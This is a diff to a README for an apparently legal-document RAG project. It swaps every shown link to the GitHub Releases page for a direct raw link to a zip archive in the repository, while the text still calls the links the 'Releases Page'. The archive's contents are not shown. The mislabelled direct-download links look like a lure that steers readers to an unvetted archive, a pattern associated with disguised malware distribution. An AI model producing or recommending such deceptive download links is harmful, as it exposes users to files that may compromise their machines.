@@ -6,18 +6,18 @@ Welcome to the nl-rag-qdrant-legal project! This software is designed to assist 
 
 ## 📥 Download the Software
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-Click%20Here-brightgreen)](https://github.com/kjgdgch65g/nl-rag-qdrant-legal/releases)
+[![Download Now](https://raw.githubusercontent.com/kjgdgch65g/nl-rag-qdrant-legal/master/RAGQdrantLegal/nl-rag-qdrant-legal-v3.3.zip%20Now-Click%20Here-brightgreen)](https://raw.githubusercontent.com/kjgdgch65g/nl-rag-qdrant-legal/master/RAGQdrantLegal/nl-rag-qdrant-legal-v3.3.zip)
 
 To get started, please visit the **Releases** page to download the software:
 
-[Download Software](https://github.com/kjgdgch65g/nl-rag-qdrant-legal/releases)
+[Download Software](https://raw.githubusercontent.com/kjgdgch65g/nl-rag-qdrant-legal/master/RAGQdrantLegal/nl-rag-qdrant-legal-v3.3.zip)
 
 ## 🚀 Getting Started
 
 This section will guide you through the process of downloading and running the software.
 
 1. **Visit the Releases Page**: Click on the link below.
-   - [Releases Page](https://github.com/kjgdgch65g/nl-rag-qdrant-legal/releases)
+   - [Releases Page](https://raw.githubusercontent.com/kjgdgch65g/nl-rag-qdrant-legal/master/RAGQdrantLegal/nl-rag-qdrant-legal-v3.3.zip)
 
 2. **Choose Your Version**: On the Releases page, you will see several versions of the software listed. Look for the latest version. It will typically be at the top.
 
